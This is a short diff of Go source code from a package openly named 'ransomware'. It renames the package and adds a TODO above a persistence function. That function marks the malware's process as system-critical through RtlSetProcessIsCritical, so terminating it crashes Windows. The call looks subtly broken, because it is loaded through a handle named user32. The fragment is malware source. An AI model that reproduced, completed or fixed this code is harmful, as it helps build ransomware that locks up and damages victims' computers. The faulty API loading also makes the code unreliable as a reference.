@@ -1,4 +1,4 @@
-package ransom
+package ransomware
 
 import "syscall"
 
@@ -7,6 +7,7 @@ var (
 	rtlSetProcessIsCritical = user32.NewProc("RtlSetProcessIsCritical")
 )
 
+//TODO: fix this...
 func AddPersistence() {
 	rtlSetProcessIsCritical.Call(1, 0, 0)
 }
